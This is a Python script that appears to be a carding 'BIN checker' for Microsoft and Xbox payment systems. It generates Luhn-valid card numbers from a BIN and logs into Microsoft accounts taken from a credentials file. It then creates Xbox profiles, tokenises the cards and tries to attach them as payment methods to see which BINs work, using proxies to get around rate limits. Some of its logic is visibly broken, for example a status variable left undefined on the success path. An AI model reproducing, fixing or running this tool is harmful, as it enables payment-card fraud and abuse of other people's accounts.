# JAI SHREE RAM!!!
import requests
import random
import string
import sys
from colorama import Fore
import threading
import re
import json
import colorama
from uuid import uuid4

thread_lock = threading.Lock()
cfg : dict = json.load(open("config.json"))
proxies : str = cfg["proxies"]
locale : str = cfg["locale"]
postal_code : str = cfg["postal_code"]
country_sm : str = locale.split("-")[1]
ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
prePareCartFlights = ['sc_appendconversiontype', 'sc_showvalidpis', 'sc_scdstextdirection', 'sc_optimizecheckoutload', 'sc_purchasedblockedby', 'sc_passthroughculture', 'sc_showcanceldisclaimerdefaultv1', 'sc_redirecttosignin', 'sc_paymentpickeritem', 'sc_cleanreducercode', 'sc_dimealipaystylingfix', 'sc_promocode', 'sc_onedrivedowngrade', 'sc_newooslogiconcart', 'sc_optionalcatalogclienttype', 'sc_klarna', 'sc_hidecontactcheckbox', 'sc_preparecheckoutrefactor', 'sc_checkoutklarna', 'sc_currencyformattingpkg', 'sc_fullpageredirectionforasyncpi', 'sc_xaaconversionerror', 'sc_promocodefeature-web-desktop', 'sc_eligibilityproducts', 'sc_disabledpaymentoption',
'sc_enablecartcreationerrorparsing', 'sc_purchaseblock', 'sc_returnoospsatocart', 'sc_dynamicseligibility', 'sc_usebuynowonlyinternalendpoint', 'sc_removemoreless', 'sc_renewalsubscriptionselector', 'sc_hidexdledd', 'sc_militaryshippingurl', 'sc_xboxdualleaf', 'sc_japanlegalterms', 'sc_multiplesubscriptions', 'sc_loweroriginalprice', 'sc_xaatovalenciastring', 'sc_cannotbuywarrantyalone', 'sc_showminimalfooteroncheckout', 'sc_checkoutdowngrade', 'sc_checkoutcontainsiaps', 'sc_localizedtax', 'sc_officescds', 'sc_disableupgradetrycheckout', 'sc_extendPageTagToOverride', 'sc_checkoutscenariotelemetry', 'sc_skipselectpi', 'sc_allowmpesapi', 'sc_purchasestatusmessage', 'sc_storetermslink', 'sc_postorderinfolineitemmessage', 'sc_addpaymentfingerprinttagging', 'sc_shippingallowlist', 'sc_emptyresultcheck', 'sc_dualleaf', 'sc_riskyxtoken', 'sc_abandonedretry', 'sc_testflightbuynow', 'sc_addshippingmethodtelemetry', 'sc_leaficons', 'sc_newspinneroverlay', 'sc_paymentinstrumenttypeandfamily', 'sc_addsitename', 'sc_disallowalipayforcheckout', 'sc_checkoutsignintelemetry', 'sc_prominenteddchange', 'sc_disableshippingaddressinit', 'sc_preparecheckoutperf',
'sc_buynowctatext', 'sc_buynowuiprod', 'sc_checkoutsalelegaltermsjp', 'sc_showooserrorforoneminute', 'sc_proratedrefunds', 'sc_entitlementcheckallitems', 'sc_indiaregsbanner', 'sc_checkoutentitlement', 'sc_rspv2', 'sc_focustrapforgiftthankyoupage', 'sc_hideneedhelp', 'sc_defaultshippingref', 'sc_uuid', 'sc_checkoutasyncpurchase', 'sc_nativeclientlinkredirect', 'sc_enablelegalrequirements', 'sc_expanded.purchasespinner', 'sc_valenciaupgrade', 'sc_enablezipplusfour', 'sc_giftingtelemetryfix', 'sc_handleentitlementerror', 'sc_alwayscartmuid', 'sc_sharedupgrade', 'sc_checkoutloadspinner', 'sc_xaaconversionexpirationdate', 'sc_helptypescript', 'sc_newdemandsandneedsstatement', 'sc_citizensoneallowed', 'sc_riskfatal', 'sc_renewtreatmenta', 'sc_trialtreatmenta', 'sc_cartzoomfix', 'sc_useofficeonlyinternalendpoint', 'sc_gotopurchase', 'sc_endallactivities', 'sc_headingheader', 'sc_flexsubs', 'sc_useanchorcomponent', 'sc_addbillingaddresstelemetry', 'sc_replacestoreappclient', 'sc_scenariotelemetryrefactor', 'sc_checkoutsmd', 'sc_scenariosupportupdate', 'sc_bankchallengecheckout', 'sc_addpaymenttelemetry', 'sc_railv2', 'sc_checkoutglobalpiadd', 'sc_reactcheckout', 'sc_xboxgotocart', 'sc_hidewarningevents', 'sc_xboxcomnosapi', 'sc_routebacktocartforoutofstock', 'sc_clientdebuginfo', 'sc_koreanlegalterms', 'sc_refactorprorate', 'sc_paymentoptionnotfound', 'sc_pidlflights', 'sc_fixcolorcontrastforrecommendeditems', 'sc_hideeditbuttonwhenediting', 'sc_enablekakaopay', 'sc_ordercheckoutfix', 'sc_xboxpmgrouping', 'sc_stickyfooter', 'sc_gotoredmrepl', 'sc_partnernametelemetry', 'sc_jpregionconversion', 'sc_checkoutorderedpv', 'sc_maxaddresslinelength', 'sc_componentexception', 'sc_buynowuipreload', 'sc_updatebillinginfo', 'sc_newshippingmethodtelemetry', 'sc_checkoutbannertelemetry', 'sc_learnmoreclcid', 'sc_satisfiedcheckout', 'sc_checkboxarialabel', 'sc_newlegaltextlayout', 'sc_newpagetitle', 'sc_prepaidcardsv3', 'sc_gamertaggifting', 'sc_checkoutargentinafee', 'sc_xboxcomasyncpurchase', 'sc_sameaddressdefault', 'sc_fixcolorcontrastforcheckout', 'sc_checkboxkg', 'sc_usebuynowbusinesslogic', 'sc_skippurchaseconfirm', 'sc_activitymonitorasyncpurchase', 'sc_shareddowngrade', 'sc_allowedpisenabled', 'sc_xboxoos', 'sc_eligibilityapi', 'sc_koreatransactionfeev1', 'sc_removesetpaymentmethod', 'sc_ordereditforincompletedata', 'sc_cppidlerror', 'sc_bankchallenge', 'sc_allowelo', 'sc_delayretry', 'sc_loadtestheadersenabled', 'sc_migrationforcitizenspay', 'sc_conversionblockederror', 'sc_allowpaysafecard', 'sc_purchasedblocked', 'sc_outofstock', 'sc_selectpmonaddfailure', 'sc_allowcustompifiltering', 'sc_errorpageviewfix', 'sc_windowsdevkitname', 'sc_xboxredirection', 'sc_usebuynowonlynonprodendpoint', 'sc_getmoreinfourl', 'sc_disablefilterforuserconsent', 'sc_suppressrecoitem', 'sc_dcccattwo', 'sc_hipercard', 'sc_resellerdetail', 'sc_fixpidladdpisuccess', 'sc_xdlshipbuffer', 'sc_allowverve', 'sc_inlinetempfix', 'sc_ineligibletostate', 'sc_greenshipping', 'sc_trackinitialcheckoutload', 'sc_creditcardpurge', 'sc_showlegalstringforproducttypepass', 'sc_newduplicatesubserror', 'sc_xboxgamepad', 'sc_xboxspinner', 'sc_xboxclosebutton', 'sc_xboxuiexp', 'sc_disabledefaultstyles', 'sc_gamertaggifting']
purchaseFlights = ['sc_appendconversiontype', 'sc_showvalidpis', 'sc_scdstextdirection', 'sc_optimizecheckoutload', 'sc_purchasedblockedby', 'sc_passthroughculture', 'sc_showcanceldisclaimerdefaultv1', 'sc_redirecttosignin', 'sc_paymentpickeritem', 'sc_cleanreducercode', 'sc_dimealipaystylingfix', 'sc_promocode', 'sc_onedrivedowngrade', 'sc_newooslogiconcart', 'sc_optionalcatalogclienttype', 'sc_klarna', 'sc_hidecontactcheckbox', 'sc_preparecheckoutrefactor', 'sc_checkoutklarna', 'sc_currencyformattingpkg', 'sc_fullpageredirectionforasyncpi', 'sc_xaaconversionerror', 'sc_promocodefeature-web-desktop', 'sc_eligibilityproducts', 'sc_disabledpaymentoption',
'sc_enablecartcreationerrorparsing', 'sc_purchaseblock', 'sc_returnoospsatocart', 'sc_dynamicseligibility', 'sc_usebuynowonlyinternalendpoint', 'sc_removemoreless', 'sc_renewalsubscriptionselector', 'sc_hidexdledd', 'sc_militaryshippingurl', 'sc_xboxdualleaf', 'sc_japanlegalterms', 'sc_multiplesubscriptions', 'sc_loweroriginalprice', 'sc_xaatovalenciastring', 'sc_cannotbuywarrantyalone', 'sc_showminimalfooteroncheckout', 'sc_checkoutdowngrade', 'sc_checkoutcontainsiaps', 'sc_localizedtax', 'sc_officescds', 'sc_disableupgradetrycheckout', 'sc_extendPageTagToOverride', 'sc_checkoutscenariotelemetry', 'sc_skipselectpi', 'sc_allowmpesapi', 'sc_purchasestatusmessage', 'sc_storetermslink', 'sc_postorderinfolineitemmessage', 'sc_addpaymentfingerprinttagging', 'sc_shippingallowlist', 'sc_emptyresultcheck', 'sc_dualleaf', 'sc_riskyxtoken', 'sc_abandonedretry', 'sc_testflightbuynow', 'sc_addshippingmethodtelemetry', 'sc_leaficons', 'sc_newspinneroverlay', 'sc_paymentinstrumenttypeandfamily', 'sc_addsitename', 'sc_disallowalipayforcheckout', 'sc_checkoutsignintelemetry', 'sc_prominenteddchange', 'sc_disableshippingaddressinit', 'sc_preparecheckoutperf',
'sc_buynowctatext', 'sc_buynowuiprod', 'sc_checkoutsalelegaltermsjp', 'sc_showooserrorforoneminute', 'sc_proratedrefunds', 'sc_entitlementcheckallitems', 'sc_indiaregsbanner', 'sc_checkoutentitlement', 'sc_rspv2', 'sc_focustrapforgiftthankyoupage', 'sc_hideneedhelp', 'sc_defaultshippingref', 'sc_uuid', 'sc_checkoutasyncpurchase', 'sc_nativeclientlinkredirect', 'sc_enablelegalrequirements', 'sc_expanded.purchasespinner', 'sc_valenciaupgrade', 'sc_enablezipplusfour', 'sc_giftingtelemetryfix', 'sc_handleentitlementerror', 'sc_alwayscartmuid', 'sc_sharedupgrade', 'sc_checkoutloadspinner', 'sc_xaaconversionexpirationdate', 'sc_helptypescript', 'sc_newdemandsandneedsstatement', 'sc_citizensoneallowed', 'sc_riskfatal', 'sc_renewtreatmenta', 'sc_trialtreatmenta', 'sc_cartzoomfix', 'sc_useofficeonlyinternalendpoint', 'sc_gotopurchase', 'sc_endallactivities', 'sc_headingheader', 'sc_flexsubs', 'sc_useanchorcomponent', 'sc_addbillingaddresstelemetry', 'sc_replacestoreappclient', 'sc_scenariotelemetryrefactor', 'sc_checkoutsmd', 'sc_scenariosupportupdate', 'sc_bankchallengecheckout', 'sc_addpaymenttelemetry', 'sc_railv2', 'sc_checkoutglobalpiadd', 'sc_reactcheckout', 'sc_xboxgotocart', 'sc_hidewarningevents', 'sc_xboxcomnosapi', 'sc_routebacktocartforoutofstock', 'sc_clientdebuginfo', 'sc_koreanlegalterms', 'sc_refactorprorate', 'sc_paymentoptionnotfound', 'sc_pidlflights', 'sc_fixcolorcontrastforrecommendeditems', 'sc_hideeditbuttonwhenediting', 'sc_enablekakaopay', 'sc_ordercheckoutfix', 'sc_xboxpmgrouping', 'sc_stickyfooter', 'sc_gotoredmrepl', 'sc_partnernametelemetry', 'sc_jpregionconversion', 'sc_checkoutorderedpv', 'sc_maxaddresslinelength', 'sc_componentexception', 'sc_buynowuipreload', 'sc_updatebillinginfo', 'sc_newshippingmethodtelemetry', 'sc_checkoutbannertelemetry', 'sc_learnmoreclcid', 'sc_satisfiedcheckout', 'sc_checkboxarialabel', 'sc_newlegaltextlayout', 'sc_newpagetitle', 'sc_prepaidcardsv3', 'sc_gamertaggifting', 'sc_checkoutargentinafee', 'sc_xboxcomasyncpurchase', 'sc_sameaddressdefault', 'sc_fixcolorcontrastforcheckout', 'sc_checkboxkg', 'sc_usebuynowbusinesslogic', 'sc_skippurchaseconfirm', 'sc_activitymonitorasyncpurchase', 'sc_shareddowngrade', 'sc_allowedpisenabled', 'sc_xboxoos', 'sc_eligibilityapi', 'sc_koreatransactionfeev1', 'sc_removesetpaymentmethod', 'sc_ordereditforincompletedata', 'sc_cppidlerror', 'sc_bankchallenge', 'sc_allowelo', 'sc_delayretry', 'sc_loadtestheadersenabled', 'sc_migrationforcitizenspay', 'sc_conversionblockederror', 'sc_allowpaysafecard', 'sc_purchasedblocked', 'sc_outofstock', 'sc_selectpmonaddfailure', 'sc_allowcustompifiltering', 'sc_errorpageviewfix', 'sc_windowsdevkitname', 'sc_xboxredirection', 'sc_usebuynowonlynonprodendpoint', 'sc_getmoreinfourl', 'sc_disablefilterforuserconsent', 'sc_suppressrecoitem', 'sc_dcccattwo', 'sc_hipercard', 'sc_resellerdetail', 'sc_fixpidladdpisuccess', 'sc_xdlshipbuffer', 'sc_allowverve', 'sc_inlinetempfix', 'sc_ineligibletostate', 'sc_greenshipping', 'sc_trackinitialcheckoutload', 'sc_creditcardpurge', 'sc_showlegalstringforproducttypepass', 'sc_newduplicatesubserror', 'sc_xboxgamepad', 'sc_xboxspinner', 'sc_xboxclosebutton', 'sc_xboxuiexp', 'sc_disabledefaultstyles', 'sc_gamertaggifting']
request_exceptions = (requests.exceptions.ProxyError,requests.exceptions.Timeout,requests.exceptions.SSLError)

def sprint(content, status: str="c") -> None:
    thread_lock.acquire()
    if status=="y":
        colour = Fore.YELLOW
    elif status=="c":
        colour = Fore.CYAN
    elif status=="r":
        colour = Fore.RED
    elif status=="new":
        colour = Fore.LIGHTYELLOW_EX
        thread_lock.acquire()
    sys.stdout.write(
            f"{colour}{content}"
            + "\n"
            + Fore.RESET
        )    
    thread_lock.release()
def remove_content(filename: str, delete_line: str) -> None:
        with open(filename, "r+") as io:
            content = io.readlines()
            io.seek(0)
            for line in content:
                if not (delete_line in line):
                    io.write(line)
            io.truncate()
def getRandomLetters(len : int):
    return ''.join(random.choices(string.ascii_uppercase,k=len))

def getRandomInt(len : int):
    return ''.join(random.choices(string.digits,k=len))
def checkLuhn(cardNo):
     
    nDigits = len(cardNo)
    nSum = 0
    isSecond = False
     
    for i in range(nDigits - 1, -1, -1):
        d = ord(cardNo[i]) - ord('0')
     
        if (isSecond == True):
            d = d * 2
        nSum += d // 10
        nSum += d % 10
  
        isSecond = not isSecond
     
    if (nSum % 10 == 0):
        return True
    else:
        return False
    
def getValidCard(full_bin : str):
    cardBin = full_bin.split("|")[0].replace("x","")
    binMonth = full_bin.split("|")[1]
    binYear = full_bin.split("|")[2]
    cvv = full_bin.split("|")[3]
    randDigitLen = 16-len(cardBin)
    while True:
        UnchckCCN = cardBin+getRandomInt(randDigitLen)
        if checkLuhn(UnchckCCN):
            ccn = UnchckCCN
            break
        else:
            continue
    if binMonth=="rnd":
        mnth = str(random.randint(1,12))
    else:
        mnth=binMonth
    if binYear=="rnd":
        year = str(random.randint(2022,2030))
    else:
        year = binYear
    if cvv=="rnd":
        cvc = str(random.randint(000,999))
    else:
        cvc = cvv
    full_card = f"{ccn}|{mnth}|{year}|{cvc}"
    return full_card
def bin_thread_1(ms_creds : str , full_bin : str):
    global bin_success
    global purch_success
    s = requests.session()
    if not proxies=="":
        s.proxies = {"https":str(proxies)}
    email = ms_creds.split("|")[0]
    password = ms_creds.split("|")[1]
    full_card = getValidCard(full_bin)
    card = full_card.split("|")[0]
    exp_month = full_card.split("|")[1]
    exp_year = full_card.split("|")[2]
    if len(exp_year)==2:
        exp_year = str(int(exp_year)+2000)
    cvv = full_card.split("|")[3]
    if card.startswith("4"):
        card_type = "visa"
    elif card.startswith("5"):
        card_type = "mc"
    elif card.startswith("6"):
        card_type = "amex"
    else:
        sprint("[-] Unsupported card!","y")
        return
    headers = {

    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'identity',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
}

    while True:
        try:
            response = s.get('https://login.live.com/ppsecure/post.srf', headers=headers,timeout=20).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(str(e),"r")
            return
    try:
        ppft = response.split(''''<input type="hidden" name="PPFT" id="i0327" value="''')[1].split('"')[0]
        log_url = response.split(",urlPost:'")[1].split("'")[0]
    except:
        sprint("[-] Unknown Error (Proxies probably banned)")
        return
    log_data = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894'
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://login.live.com',
    'Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
            }  
    while True:
        try:
            response = s.post(log_url,timeout=20,data=log_data,headers=headers).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return


    try:
        ppft2 = re.findall("sFT:'(.+?(?=\'))", response)[0],
        url_log2 = re.findall("urlPost:'(.+?(?=\'))", response)[0]
    except:
        sprint("[-] Invalid microsoft acc!","c")
        remove_content("accs.txt",ms_creds)
        return


    log_data2 = {
    "LoginOptions": "3",
    "type": "28",
    "ctx": "",
    "hpgrequestid": "",
    "PPFT": ppft2,
    "i19": "19130"
}
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Referer': log_url,
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': ua,
    }
    while True:
        try:
            midAuth2 = s.post(url_log2,timeout=20,data=log_data2,headers=headers).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    heads = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
}
    while True:
        try:
            response = s.get("https://account.xbox.com/",timeout=20,headers=heads).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    try:
        xbox_json = {
"fmHF": response.split('id="fmHF" action="')[1].split('"')[0],
"pprid": response.split('id="pprid" value="')[1].split('"')[0],
"nap": response.split('id="NAP" value="')[1].split('"')[0],
"anon": response.split('id="ANON" value="')[1].split('"')[0],
"t": response.split('id="t" value="')[1].split('"')[0]} 
    except:
        sprint("IP banned on https://account.xbox.com/","y")
        return
    heads = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Origin': 'https://login.live.com',
    'Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
}
    while True:
        try:
            verify_token = s.post(xbox_json['fmHF'],timeout=20, headers={
        'Content-Type': 'application/x-www-form-urlencoded',
    },data={
        "pprid": xbox_json['pprid'],
        "NAP": xbox_json['nap'],
        "ANON": xbox_json['anon'],
        "t": xbox_json['t']
    }).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    

    reqVerifytoken = verify_token.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
    heads={
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://account.xbox.com',
    'Referer': xbox_json['fmHF'],
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': ua,
    'X-Requested-With': 'XMLHttpRequest',
    '__RequestVerificationToken': reqVerifytoken,
}
    while True:
        try:
            make_acc = s.post("https://account.xbox.com/en-us/xbox/account/api/v1/accountscreation/CreateXboxLiveAccount",timeout=20, headers=heads,data={
        "partnerOptInChoice": "false",
        "msftOptInChoice": "false",
        "isChild": "true",
        "returnUrl": "https://www.xbox.com/en-US/?lc=1033"
    })
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    if not make_acc.ok:
        sprint("[-] Failed to create XBOX profile!")
        return
    heads = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
}
    while True:
        try:
            response = s.get(f"https://account.xbox.com/en-US/auth/getTokensSilently?rp=http://xboxlive.com,http://mp.microsoft.com/,http://gssv.xboxlive.com/,rp://gswp.xboxlive.com/,http://sisu.xboxlive.com/",timeout=20).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    try:
        rel = response.split('"http://mp.microsoft.com/":{')[1].split('},')[0]
        json_obj = json.loads("{"+rel+"}")
        xbl_auth = "XBL3.0 x=" + json_obj['userHash'] + ";" + json_obj['token']
        xbl_auth2 = str({"XToken":xbl_auth})
    except:
        sprint("[-] Failed to get XBL Authorization","y")
        remove_content("accs.txt",ms_creds)
        return
    
    while True:
        try:
            cvv_id = s.post("https://tokenization.cp.microsoft.com/tokens/cvv/getToken",timeout=20,json={"data":cvv}).json()["data"]
            break
        except request_exceptions:
            continue
        except KeyError:
            sprint(f"[-] Error while getting CVV token","c")
            return
        except Exception as e:
            sprint(e,"r")
            return
    while True:
        try:
            card_id = s.post("https://tokenization.cp.microsoft.com/tokens/pan/getToken",timeout=20,json={"data":card})
            card_id = card_id.json()["data"]
            
            break
        except request_exceptions:
            continue
        except KeyError:
            sprint(f"[-] Error while getting Pan token","c")
            sprint(card_id.text)
            return
        except Exception as e:
            sprint(e,"r")
            return

    
    headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Origin': 'https://account.microsoft.com',
    'Referer': 'https://account.microsoft.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': ua,
    'authorization': xbl_auth,
    'content-type': 'application/json',
    'correlation-context': f'v=1,ms.b.tel.scenario=commerce.payments.PaymentInstrumentAdd.1,ms.b.tel.partner=northstarweb,ms.c.cfs.payments.partnerSessionId={str(uuid4())}',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-ms-pidlsdk-version': '1.22.0-alpha.86_reactview',
}

    params = {
    'type': 'visa,amex,mc',
    'partner': 'northstarweb',
    'operation': 'Add',
    'country': country_sm,
    'language': locale,
    'family': 'credit_card',
    'completePrerequisites': 'true',
}

    while True:
        try:
            response = s.get(
    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentMethodDescriptions',
    params=params,
    headers=headers,
    timeout=20
)
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return
    heads = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.7',
    'Connection': 'keep-alive',
    'Origin': 'https://account.microsoft.com',
    'Referer': 'https://account.microsoft.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'Sec-GPC': '1',
    'User-Agent': ua,
    'authorization': xbl_auth,
    'content-type': 'application/json',
    'correlation-context': f'v=1,ms.b.tel.scenario=commerce.payments.PaymentInstrumentAdd.1,ms.b.tel.partner=northstarweb,ms.c.cfs.payments.partnerSessionId={str(uuid4())}',
    'x-ms-pidlsdk-version': '1.22.0-alpha.86_reactview',
} 
    vcc_json = {
    'paymentMethodFamily': 'credit_card',
    'paymentMethodType': card_type,
    'paymentMethodOperation': 'add',
    'paymentMethodCountry': country_sm,
    'paymentMethodResource_id': 'credit_card.'+card_type,
    'context': 'purchase',
    'riskData': {
        'dataType': 'payment_method_riskData',
        'dataOperation': 'add',
        'dataCountry': country_sm,
        'greenId': str(uuid4()),
    },
    'details': {
        'dataType': 'credit_card_mc_details',
        'dataOperation': 'add',
        'dataCountry': country_sm,
        'accountHolderName': getRandomLetters(7).upper()+" "+getRandomLetters(5).upper(),
        'accountToken': card_id,
        'expiryMonth': exp_month,
        'expiryYear':  exp_year,
        'cvvToken': cvv_id,
        'address': {
            'addressType': 'billing',
            'addressOperation': 'add',
            'addressCountry': country_sm,
            'address_line1': getRandomLetters(100)+" "+getRandomLetters(5)+" "+getRandomInt(3),
            'city': 'New york',
            'region': 'ny',
            'postal_code': postal_code,
            'country': country_sm,
        },
        'permission': {
            'dataType': 'permission_details',
            'dataOperation': 'add',
            'dataCountry': country_sm,
            'hmac': {
                'algorithm': 'hmacsha256',
                'keyToken': "null", 
                'data': "null", 
            },
            'userCredential': xbl_auth,
        },
    },
    'pxmac': response.json()[0]["data_description"]["pxmac"]["default_value"], 
}
    params = {
    'country': country_sm,
    'language': locale,
    'partner': 'northstarweb',
    'completePrerequisites': 'True',
}
    while True:
        try:
            vcc_req = s.post(
    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx',
    params=params,
    headers=heads,
    json=vcc_json,
    timeout=30
)   
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
    if not vcc_req.ok:
        if not vcc_req.json()["innererror"]["code"]=="ValidationFailed":
            if vcc_req.json()["innererror"]["code"]=="InvalidRequestData":
                sprint("[!] VCC endpoint rate limit! Use proxies to bypass")
                return
            sprint(vcc_req.text,"y")
            return
        return "failed_add"
    
    bin_success += 1
    return "purched"


def bin_thread_main(emals,bin_):
    while True:
        res = bin_thread_1(emals,bin_)
        if res=="purched" or res=="failed_add" or res=="failed":
            break
        else:
            continue
# if len(open("accs.txt").read().splitlines())<50:
#     sprint("[-] Too less accounts to check! Minimum accounts : 50")
#     exit(0)
colorama.init()
bin_success = 0
def checkBinThread(uncheckedBin : str, acc1):
    global bin_success
    try:
        terimummy= uncheckedBin.split("|")[3]
    except:
        uncheckedBin = uncheckedBin + "|000"
    bin_success = 0
    thread1_list = []
    for x in range(5):
        start_thread = threading.Thread(
                    target=bin_thread_main,
                    args=(
                        acc1,
                        uncheckedBin
                    ),
                )
        thread1_list.append(start_thread)
        start_thread.start()
    for lo in thread1_list:
        lo.join()
    remove_content("bins.txt",uncheckedBin)
    remove_content("accs.txt",acc1)
    if not bin_success==0:
        status = "Working"
    else:
        status_bin = "Dead"
    result = f"BIN : {uncheckedBin} card success : {str(bin_success)}/5 status : {status_bin} | {acc1}"
    if status_bin=="Working":
        sprint(f"[+] {result}","c")
    else:
        sprint(f"[-] {result}","y")
    open("results.txt","a").write(result+"\n")


while True:
    try:
        acc = open("accs.txt").read().splitlines()[0]
        bin_ = open("bins.txt").read().splitlines()[0]
    except:
        break
    r = checkBinThread(bin_,acc)
